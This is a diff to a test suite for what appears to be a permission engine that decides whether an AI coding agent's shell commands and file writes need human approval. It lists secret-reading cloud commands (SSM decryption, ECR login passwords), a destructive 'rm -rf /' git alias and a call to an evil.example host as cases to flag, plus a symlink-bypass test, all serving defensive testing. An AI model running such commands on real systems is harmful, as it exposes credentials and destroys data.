@@ -122,6 +122,7 @@ describe("permissive profile", () => {
     "az cosmosdb list --query name -o tsv",
     "az webapp show --name x --resource-group y",
     "aws s3api list-buckets",
+    "aws sts get-caller-identity",
     "gcloud run services describe svc",
     "git config core.bare false",
     "git config --local user.email t@example.com",
@@ -180,6 +181,11 @@ describe("permissive profile", () => {
     ["az webapp list --endpoint-url https://evil.example", "impactful-write"],
     ["aws secretsmanager get-secret-value --secret-id x", "sensitive"],
     ["aws iam create-user --user-name x", "impactful-write"],
+    ["aws ssm get-parameter --name /prod/db --with-decryption", "impactful-write"],
+    ["aws ssm get-parameters-by-path --path /prod", "impactful-write"],
+    ["aws lightsail get-instance-access-details --instance-name example", "impactful-write"],
+    ["aws ec2 get-password-data --instance-id i-1", "sensitive"],
+    ["aws ecr get-login-password", "sensitive"],
     ["git config core.hooksPath /tmp/hooks", "sensitive"],
     ["git config alias.st '!rm -rf /'", "sensitive"],
     ["git config --global user.name x", "sensitive"],
@@ -369,6 +375,25 @@ describe("protected names are relative to the repository root", () => {
     expect(evaluate(write("AGENTS.md"), undefined, profile).decision).toBe("human");
     expect(decide("echo x > src/a.txt", nested).decision).toBe("approve");
     expect(decide("sed -i '' s/a/b/ .claude/settings.json", nested).decision).toBe("human");
+  });
+
+  test("a protected name that is a symlink stays protected", () => {
+    const linked = join(repo, ".claude");
+    rmSync(linked, { recursive: true, force: true });
+    mkdirSync(join(repo, "config"), { recursive: true });
+    symlinkSync(join(repo, "config"), linked);
+    const write = (file: string): Request => ({
+      sessionId: "t",
+      harness: "claude",
+      cwd: repo,
+      tool: "Write",
+      input: { file_path: file, content: "" },
+    });
+    expect(evaluate(write(".claude/settings.json"), undefined, profile).decision).toBe("human");
+    expect(evaluate(write(join(linked, "settings.json")), undefined, profile).decision).toBe(
+      "human",
+    );
+    expect(decide("echo x > .claude/settings.json", repo).decision).toBe("human");
   });
 });
 
